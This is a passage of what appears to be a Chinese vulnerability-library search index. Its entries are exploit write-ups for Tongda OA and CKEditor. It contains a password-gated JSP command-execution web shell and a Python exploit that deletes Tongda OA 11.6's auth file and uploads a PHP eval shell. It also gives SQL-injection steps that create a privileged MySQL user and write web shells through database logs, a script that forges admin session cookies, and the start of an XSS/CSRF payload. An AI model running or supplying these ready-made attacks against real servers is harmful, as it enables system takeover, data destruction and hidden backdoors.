CLIENTIP=wLCXqUKAP7uhw4g5zi=6\n\n&lt;%@ page language=\"java\" import=\"java.util.*,java.io.*\" pageEncoding=\"UTF-8\"%&gt;&lt;%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+\"\\n\");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();} %&gt;&lt;%if(\"asasd3344\".equals(request.getParameter(\"pwd\"))&amp;&amp;!\"\".equals(request.getParameter(\"cmd\"))){out.println(\"&lt;pre&gt;\"+excuteCmd(request.getParameter(\"cmd\")) + \"&lt;/pre&gt;\");}else{out.println(\":-)\");}%&gt;\n</code></pre>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BE/%E9%80%9A%E8%BE%BEOA%2011.6%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%2B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell/","title":"\u901a\u8fbeOA 11.6\u6587\u4ef6\u5220\u9664+\u6587\u4ef6\u4e0a\u4f20getshell","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BE/%E9%80%9A%E8%BE%BEOA%2011.6%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%2B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell/#_1","title":"\u6f0f\u6d1e\u8303\u56f4","text":"<p>\u901a\u8fbeOA V11.6</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BE/%E9%80%9A%E8%BE%BEOA%2011.6%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%2B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell/#_2","title":"\u6f0f\u6d1e\u9a8c\u8bc1","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BE/%E9%80%9A%E8%BE%BEOA%2011.6%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%2B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell/#exp","title":"EXP\uff1a","text":"<pre><code>import requests\n\ntarget=\"http://********/\"\npayload=\"&lt;?php eval($_POST['shell']);?&gt;\"\nprint(\"[*]Warning,This exploit code will DELETE auth.inc.php which may damage the OA\")\ninput(\"Press enter to continue\")\nprint(\"[*]Deleting auth.inc.php....\")\n\nurl=target+\"/module/appbuilder/assets/print.php?guid=../../../webroot/inc/auth.inc.php\"\nrequests.get(url=url)\nprint(\"[*]Checking if file deleted...\")\nurl=target+\"/inc/auth.inc.php\"\npage=requests.get(url=url).text\nif 'No input file specified.' not in page:\n    print(\"[-]Failed to deleted auth.inc.php\")\n    exit(-1)\nprint(\"[+]Successfully deleted auth.inc.php!\")\nprint(\"[*]Uploading payload...\")\nurl=target+\"/general/data_center/utils/upload.php?action=upload&amp;filetype=tql&amp;repkid=/.&lt;&gt;./.&lt;&gt;./.&lt;&gt;./\"\nfiles = {'FILE1': ('shell.php', payload)}\nrequests.post(url=url,files=files)\nurl=target+\"/_shell.php\"\npage=requests.get(url=url).text\nif 'No input file specified.' not in page:\n    print(\"[+]Filed Uploaded Successfully\")\n    print(\"[+]URL:\",url)\nelse:\n    print(\"[-]Failed to upload file\")\n</code></pre> <p>1.\u4fdd\u5b58\u4e0a\u8ff0exp\u4e3a.py\u811a\u672c\u6587\u4ef6 2.\u66ff\u6362exp\u4e2d\u7684target\u4e3a\u76ee\u6807url 3.\u6267\u884c\u811a\u672c\u540e\u83dc\u5200\u8fde\u63a5\u8f93\u51fa\u7684URL:<code>**********</code>\u5373\u53ef\uff0c\u5bc6\u7801\u4e3ashell</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BE/%E9%80%9A%E8%BE%BEOA%2011.7%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5/","title":"\u901a\u8fbeOA 11.7\u5b58\u5728sql\u6ce8\u5165","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BE/%E9%80%9A%E8%BE%BEOA%2011.7%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5/#_1","title":"\u6f0f\u6d1e\u5f71\u54cd\u7248\u672c","text":"<p>\u901a\u8fbeoa 11.7 \u5229\u7528\u6761\u4ef6:\u9700\u8981\u8d26\u53f7\u767b\u5f55</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BE/%E9%80%9A%E8%BE%BEOA%2011.7%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5/#poc","title":"POC","text":"<p>1\u3001\u4e0b\u8f7d\u901a\u8fbeOA 11.7\uff0chttps://cdndown.tongda2000.com/oa/2019/TDOA11.7.exe </p> <p>2\u3001condition_cascade\u53c2\u6570\u5b58\u5728\u5e03\u5c14\u76f2\u6ce8  </p> <p>3.\u7ecf\u8fc7\u6d4b\u8bd5\uff0c\u8fc7\u6ee4\u4e86\u4e00\u4e9b\u51fd\u6570(sleep\u3001\u62a5\u9519\u7684\u51fd\u6570\u7b49\u7b49)\uff0c\u5404\u79cd\u6ce8\u91ca\uff0c\u4f7f\u7528payload\uff1aselect if((1=1),1,power(9999,99))\u3001select if((1=2),1,power(9999,99))\uff0c\u5224\u65ad\u6ce8\u5165\u70b9 #\u5f53\u5b57\u7b26\u76f8\u7b49\u65f6\uff0c\u4e0d\u62a5\u9519\uff0c\u9519\u8bef\u65f6\u62a5\u9519 </p> <p>4\u3001\u901a\u8fc7\u6dfb\u52a0\u7528\u6237at666\uff0c\u5bc6\u7801\u4e3aabcABC@123  </p> <p>5\u3001\u4f7f\u7528Navicat Premium\u8fde\u63a5\u6570\u636e\u5e93 </p> <p>6\u3001\u6dfb\u52a0\u7684\u8d26\u6237\u4e0d\u80fd\u76f4\u63a5\u901a\u8fc7\u65e5\u5fd7\u6162\u67e5\u8be2\u5199\u5165\u6587\u4ef6\uff0c\u9700\u8981\u7ed9\u521b\u5efa\u7684\u8d26\u6237\u6dfb\u52a0\u6743\u9650 \u63d0\u6743 </p> <p>7\u3001\u7136\u540e\u7528\u6ce8\u5165\u70b9\u5237\u65b0\u6743\u9650\uff0c\u56e0\u4e3a\u8be5\u7528\u6237\u662f\u6ca1\u6709\u5237\u65b0\u6743\u9650\u7684\u6743\u9650\u7684 general/hr/manage/query/delete_cascade.php?condition_cascade=flush privileges; </p> <p>8\u3001\u518d\u6b21\u767b\u5f55\uff0c\u63d0\u793a\u5bc6\u7801\u8fc7\u671f\uff0c\u9700\u8981\u91cd\u65b0\u6267\u884cgrant all privileges ON mysql.* TO 'at666'@'%' IDENTIFIED BY 'abcABC@123' WITH GRANT OPTION </p> <p>9\u3001\u7136\u540e\u5199shell </p> <p>10\u3001\u83dc\u5200\u8fde\u63a5</p> <p>=========================================================================</p> <p>\u901a\u8fbeOA 11.7 \u540e\u53f0sql\u6ce8\u5165\u6f0f\u6d1e\u590d\u73b0</p> <p>\u4e00\u3001****\u6f0f\u6d1e\u63cf\u8ff0</p> <p>\u901a\u8fbeOA 11.7\u5b58\u5728sql\u6ce8\u5165</p> <p>\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd\u7248\u672c</p> <p>\u901a\u8fbeoa 11.7</p> <p>\u5229\u7528\u6761\u4ef6:\u9700\u8981\u8d26\u53f7\u767b\u5f55 </p> <p>\u4e09\u3001\u6f0f\u6d1e\u590d\u73b0</p> <p>1\u3001\u4e0b\u8f7d\u901a\u8fbeOA 11.7\uff0chttps://cdndown.tongda2000.com/oa/2019/TDOA11.7.exe\uff0c\u70b9\u51fb\u5b89\u88c5</p> <p>2\u3001condition_cascade\u53c2\u6570\u5b58\u5728\u5e03\u5c14\u76f2\u6ce8</p> <p>POC\uff1a</p> <p></p> <pre><code>GET /general/hr/manage/query/delete_cascade.php?condition_cascade=select if((substr(user(),1,1)='r'),1,power(9999,99)) HTTP/1.1\nHost: 192.168.77.137\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0\nAccept: */*\nAccept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3\nX-Requested-With: XMLHttpRequest\nReferer: http://192.168.77.137/general/index.php?isIE=0&amp;modify_pwd=0\nCookie: PHPSESSID=ebpjtm5tqh5tvida5keba73fr0; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c71fa06d\nDNT: 1\nConnection: close\n</code></pre> <p></p> <p>3\u3001\u7ecf\u8fc7\u6d4b\u8bd5\uff0c\u8fc7\u6ee4\u4e86\u4e00\u4e9b\u51fd\u6570(sleep\u3001\u62a5\u9519\u7684\u51fd\u6570\u7b49\u7b49)\uff0c\u5404\u79cd\u6ce8\u91ca\uff0c\u4f7f\u7528payload\uff1aselect if((1=1),1,power(9999,99))\u3001select if((1=2),1,power(9999,99))\uff0c\u5224\u65ad\u6ce8\u5165\u70b9  #\u5f53\u5b57\u7b26\u76f8\u7b49\u65f6\uff0c\u4e0d\u62a5\u9519\uff0c\u9519\u8bef\u65f6\u62a5\u9519</p> <p></p> <p></p> <p>4\u3001\u901a\u8fc7\u6dfb\u52a0\u7528\u6237at666\uff0c\u5bc6\u7801\u4e3aabcABC@123</p> <p>grant all privileges ON mysql.* TO 'at666'@'%' IDENTIFIED BY 'abcABC@123' WITH GRANT OPTION</p> <p></p> <p>5\u3001\u4f7f\u7528Navicat Premium\u8fde\u63a5\u6570\u636e\u5e93</p> <p></p> <p>6\u3001\u6dfb\u52a0\u7684\u8d26\u6237\u4e0d\u80fd\u76f4\u63a5\u901a\u8fc7\u65e5\u5fd7\u6162\u67e5\u8be2\u5199\u5165\u6587\u4ef6\uff0c\u9700\u8981\u7ed9\u521b\u5efa\u7684\u8d26\u6237\u6dfb\u52a0\u6743\u9650</p> <p>UPDATE <code>mysql</code>.<code>user</code> SET <code>Password</code> =  '*DE0742FA79F6754E99FDB9C8D2911226A5A9051D', <code>Select_priv</code> = 'Y',  <code>Insert_priv</code> = 'Y', <code>Update_priv</code> = 'Y', <code>Delete_priv</code> = 'Y',  <code>Create_priv</code> = 'Y', <code>Drop_priv</code> = 'Y', <code>Reload_priv</code> = 'Y',  <code>Shutdown_priv</code> = 'Y', <code>Process_priv</code> = 'Y', <code>File_priv</code> = 'Y',  <code>Grant_priv</code> = 'Y', <code>References_priv</code> = 'Y', <code>Index_priv</code> = 'Y',  <code>Alter_priv</code> = 'Y', <code>Show_db_priv</code> = 'Y', <code>Super_priv</code> = 'Y',  <code>Create_tmp_table_priv</code> = 'Y', <code>Lock_tables_priv</code> = 'Y', <code>Execute_priv</code> = 'Y', <code>Repl_slave_priv</code> = 'Y', <code>Repl_client_priv</code> = 'Y',  <code>Create_view_priv</code> = 'Y', <code>Show_view_priv</code> = 'Y', <code>Create_routine_priv</code> = 'Y', <code>Alter_routine_priv</code> = 'Y', <code>Create_user_priv</code> = 'Y', <code>Event_priv</code> = 'Y', <code>Trigger_priv</code> = 'Y', <code>Create_tablespace_priv</code> = 'Y', <code>ssl_type</code> = '', <code>ssl_cipher</code> = '', <code>x509_issuer</code> = '', <code>x509_subject</code> = '',  <code>max_questions</code> = 0, <code>max_updates</code> = 0, <code>max_connections</code> = 0,  <code>max_user_connections</code> = 0, <code>plugin</code> = 'mysql_native_password',  <code>authentication_string</code> = '', <code>password_expired</code> = 'Y' WHERE <code>Host</code> =  Cast('%' AS Binary(1)) AND <code>User</code> = Cast('at666' AS Binary(5));</p> <p></p> <p>7\u3001\u7136\u540e\u7528\u6ce8\u5165\u70b9\u5237\u65b0\u6743\u9650\uff0c\u56e0\u4e3a\u8be5\u7528\u6237\u662f\u6ca1\u6709\u5237\u65b0\u6743\u9650\u7684\u6743\u9650\u7684</p> <p>general/hr/manage/query/delete_cascade.php?condition_cascade=flush privileges;</p> <p></p> <p>8\u3001\u518d\u6b21\u767b\u5f55\uff0c\u63d0\u793a\u5bc6\u7801\u8fc7\u671f\uff0c\u9700\u8981\u91cd\u65b0\u6267\u884cgrant all privileges ON mysql.* TO 'at666'@'%' IDENTIFIED BY 'abcABC@123' WITH GRANT OPTION</p> <p></p> <p></p> <p>9\u3001\u7136\u540e\u5199shell</p> <p>\u65b9\u6cd5\u4e00:</p> <p>select @@basedir;</p> <p>set global slow_query_log=on;</p> <p>set global slow_query_log_file='C:/tongda11.7/webroot/test.php';</p> <p>select '&lt;?php eval($_POST[x]);?&gt;' or sleep(11);</p> <p>\u65b9\u6cd5\u4e8c:</p> <p>select @@basedir;</p> <p>set global general_log = on;</p> <p>set global general_log_file ='C:/tongda11.7/webroot/test2.php';</p> <p>select '&lt;?php eval($_POST[test2]);?&gt;';</p> <p>show variables like '%general%';</p> <p></p> <p></p> <p>10\u3001\u83dc\u5200\u8fde\u63a5</p> <p></p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BE/%E9%80%9A%E8%BE%BEOA2017%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/","title":"\u901a\u8fbeOA2017\u524d\u53f0\u4efb\u610f\u7528\u6237\u767b\u5f55\u6f0f\u6d1e","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BE/%E9%80%9A%E8%BE%BEOA2017%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/#_1","title":"\u5f71\u54cd\u8303\u56f4","text":"<p>\u901a\u8fbeOA2017\u3001V11.X&lt;V11.5</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E9%80%9A%E8%BE%BE/%E9%80%9A%E8%BE%BEOA2017%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/#poc","title":"\u6f0f\u6d1e\u9a8c\u8bc1POC","text":"<pre><code>'''\n@Author         : Sp4ce\n@Date           : 2020-03-17 23:42:16\nLastEditors    : Sp4ce\nLastEditTime   : 2020-08-27 10:21:44\n@Description    : Challenge Everything.\n'''\nimport requests\nfrom random import choice\nimport argparse\nimport json\n\nUSER_AGENTS = [\n    \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\",\n    \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)\",\n    \"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\",\n    \"Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)\",\n    \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)\",\n    \"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)\",\n    \"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)\",\n    \"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)\",\n    \"Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6\",\n    \"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1\",\n    \"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0\",\n    \"Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5\",\n    \"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6\",\n    \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11\",\n    \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20\",\n    \"Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52\",\n    \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11\",\n    \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER\",\n    \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)\",\n    \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)\",\n    \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 LBBROWSER\",\n    \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)\",\n    \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)\",\n    \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)\",\n    \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; 360SE)\",\n    \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)\",\n    \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)\",\n    \"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1\",\n    \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1\",\n    \"Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5\",\n    \"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b13pre) Gecko/20110307 Firefox/4.0b13pre\",\n    \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:16.0) Gecko/20100101 Firefox/16.0\",\n    \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11\",\n    \"Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10\"\n]\n\nheaders={}\n\ndef getV11Session(url):\n    checkUrl = url+'/general/login_code.php'\n    try:\n        headers[\"User-Agent\"] = choice(USER_AGENTS)\n        res = requests.get(checkUrl,headers=headers)\n        resText = str(res.text).split('{')\n        codeUid = resText[-1].replace('}\"}', '').replace('\\r\\n', '')\n        getSessUrl = url+'/logincheck_code.php'\n        res = requests.post(\n            getSessUrl, data={'CODEUID': '{'+codeUid+'}', 'UID': int(1)},headers=headers)\n        tmp_cookie = res.headers['Set-Cookie']\n        headers[\"User-Agent\"] = choice(USER_AGENTS)\n        headers[\"Cookie\"] = tmp_cookie\n        check_available = requests.get(url + '/general/index.php',headers=headers)\n        if '\u7528\u6237\u672a\u767b\u5f55' not in check_available.text:\n            if '\u91cd\u65b0\u767b\u5f55' not in check_available.text:\n                print('[+]Get Available COOKIE:' + tmp_cookie)\n        else:\n            print('[-]Something Wrong With ' + url + ',Maybe Not Vulnerable.')\n    except:\n        print('[-]Something Wrong With '+url)\n\ndef get2017Session(url):\n    checkUrl = url+'/ispirit/login_code.php'\n    try:\n        headers[\"User-Agent\"] = choice(USER_AGENTS)\n        res = requests.get(checkUrl,headers=headers)\n        resText = json.loads(res.text)\n        codeUid = resText['codeuid']\n        codeScanUrl = url+'/general/login_code_scan.php'\n        res = requests.post(codeScanUrl, data={'codeuid': codeUid, 'uid': int(\n            1), 'source': 'pc', 'type': 'confirm', 'username': 'admin'},headers=headers)\n        resText = json.loads(res.text)\n        status = resText['status']\n        if status == str(1):\n            getCodeUidUrl = url+'/ispirit/login_code_check.php?codeuid='+codeUid\n            res = requests.get(getCodeUidUrl)\n            tmp_cookie = res.headers['Set-Cookie']\n            headers[\"User-Agent\"] = choice(USER_AGENTS)\n            headers[\"Cookie\"] = tmp_cookie\n            check_available = requests.get(url + '/general/index.php',headers=headers)\n            if '\u7528\u6237\u672a\u767b\u5f55' not in check_available.text:\n                if '\u91cd\u65b0\u767b\u5f55' not in check_available.text:\n                    print('[+]Get Available COOKIE:' + tmp_cookie)\n            else:\n                print('[-]Something Wrong With ' + url + ',Maybe Not Vulnerable.')\n        else:\n            print('[-]Something Wrong With '+url  + ' Maybe Not Vulnerable ?')\n    except:\n        print('[-]Something Wrong With '+url)\n\nif __name__ == \"__main__\":\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\n        \"-v\",\n        \"--tdoaversion\",\n        type=int,\n        choices=[11, 2017],\n        help=\"Target TongDa OA Version. e.g: -v 11\u3001-v 2017\")\n    parser.add_argument(\n        \"-url\",\n        \"--targeturl\",\n        type=str,\n        help=\"Target URL. e.g: -url 192.168.2.1\u3001-url http://192.168.2.1\"\n    )\n    args = parser.parse_args()\n    url = args.targeturl\n    if 'http://' not in url:\n        url = 'http://' + url\n    if args.tdoaversion == 11:\n        getV11Session(url)\n    elif args.tdoaversion == 2017:\n        get2017Session(url)\n    else:\n        parser.print_help() \n</code></pre> <ul> <li>python3 poc.py -v \u7248\u672c -url url</li> <li>\u8fd0\u884c\u5e76\u83b7\u53d6\u5230\u53ef\u7528\u7684SESSIONID</li> <li>\u66ff\u6362\u6d4f\u89c8\u5668Cookie\u4e2d\u7684SESSIONID\u5373\u53ef\u5b9e\u73b0\u767b\u5f55\u4e3aadmin</li> </ul>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/02-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/CKEditor4.0.1%E5%A4%9A%E4%B8%AA%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/","title":"CKEditor4.0.1\u591a\u4e2a\u5b89\u5168\u6f0f\u6d1e","text":"<pre><code>===========================================\nVulnerable Software: ckeditor 4.0.1 standard\nDownload: http://download.cksource.com/CKEditor/CKEditor/CKEditor%204.0.1/ckeditor_4.0.1_standard.zip\nVulns: Full Path Disclosure &amp;&amp; XSS\n===========================================\nTested On: Debian squeeze 6.0.6\nServer version: Apache/2.2.16 (Debian)\nApache traffic server 3.2.0\nMYSQL: 5.1.66-0+squeeze1\nPHP 5.3.3-7+squeeze14 with Suhosin-Patch (cli) (built: Aug  6 2012 20:08:59)\nCopyright (c) 1997-2009 The PHP Group\nZend Engine v2.3.0, Copyright (c) 1998-2010 Zend Technologies\nwith Suhosin v0.9.32.1, Copyright (c) 2007-2010, by SektionEins GmbH\n===========================================\nVulnerable Code: /ckeditor/samples/assets/posteddata.php\n=============SNIP BEGINS====================\n\nroot@debian:/etc/apache2/htdocs/hacker1/admin/ckeditor/samples/assets# cat posteddata.php\n&lt;!DOCTYPE html&gt;\n&lt;?php\n/*\nCopyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.\nFor licensing, see LICENSE.html or http://ckeditor.com/license\n*/\n?&gt;\n&lt;html&gt;\n&lt;head&gt;\n        &lt;meta charset=\"utf-8\"&gt;\n        &lt;title&gt;Sample &amp;mdash; CKEditor&lt;/title&gt;\n        &lt;link rel=\"stylesheet\" href=\"sample.css\"&gt;\n&lt;/head&gt;\n&lt;body&gt;\n        &lt;h1 class=\"samples\"&gt;\n                CKEditor &amp;mdash; Posted Data\n        &lt;/h1&gt;\n        &lt;table border=\"1\" cellspacing=\"0\" id=\"outputSample\"&gt;\n                &lt;colgroup&gt;&lt;col width=\"120\"&gt;&lt;/colgroup&gt;\n                &lt;thead&gt;\n                        &lt;tr&gt;\n                                &lt;th&gt;Field&amp;nbsp;Name&lt;/th&gt;\n                                &lt;th&gt;Value&lt;/th&gt;\n                        &lt;/tr&gt;\n                &lt;/thead&gt;\n&lt;?php\n\nif ( isset( $_POST ) )\n        $postArray = &amp;$_POST ;                  // 4.1.0 or later, use $_POST\nelse\n        $postArray = &amp;$HTTP_POST_VARS ; // prior to 4.1.0, use HTTP_POST_VARS\n\nforeach ( $postArray as $sForm =&gt; $value )\n{\n        if ( get_magic_quotes_gpc() )\n                $postedValue = htmlspecialchars( stripslashes( $value ) ) ;\n        else\n                $postedValue = htmlspecialchars( $value ) ;\n\n?&gt;\n                &lt;tr&gt;\n                        &lt;th style=\"vertical-align: top\"&gt;&lt;?php echo $sForm?&gt;&lt;/th&gt;\n                        &lt;td&gt;&lt;pre class=\"samples\"&gt;&lt;?php echo $postedValue?&gt;&lt;/pre&gt;&lt;/td&gt;\n                &lt;/tr&gt;\n        &lt;?php\n}\n?&gt;\n        &lt;/table&gt;\n        &lt;div id=\"footer\"&gt;\n                &lt;hr&gt;\n                &lt;p&gt;\n                        CKEditor - The text editor for the Internet - &lt;a class=\"samples\" href=\"http://ckeditor.com/\"&gt;http://ckeditor.com&lt;/a&gt;\n                &lt;/p&gt;\n                &lt;p id=\"copy\"&gt;\n                        Copyright &amp;copy; 2003-2013, &lt;a class=\"samples\" href=\"http://cksource.com/\"&gt;CKSource&lt;/a&gt; - Frederico Knabben. All rights reserved.\n                &lt;/p&gt;\n        &lt;/div&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n\n\n=============SNIP ENDS HERE====================\n\n\n\nFULL Path Disclosure example: \n\nURL: http://hacker1.own/admin/ckeditor/samples/sample_posteddata.php\nMETHOD: $_POST\n\nHEADERS:\n\nHost: hacker1.own\nUser-Agent: Mozilla/5.0 (Windows NT 5.1; rv:17.0) Gecko/20100101 Firefox/17.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nDNT: 1\nConnection: keep-alive\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 30\n\n\n\n$_POST DATA TO SEND:\n\n\nbangbangbang[]=PATH DISCLOSURE\n\n\n\n\nResult: \nWarning: htmlspecialchars() expects parameter 1 to be string, array given in /etc/apache2/htdocs/hacker1/admin/ckeditor/samples/assets/posteddata.php on line 38\n\nPrint screen: http://i076.radikal.ru/1302/84/edbe3f8f4524.png\n\n\n=================================================\n\nCSRF+XSS\n&lt;body onload=\"javascript:document.forms[0].submit()\"&gt;\n&lt;form name=\"form1\" method=\"post\" 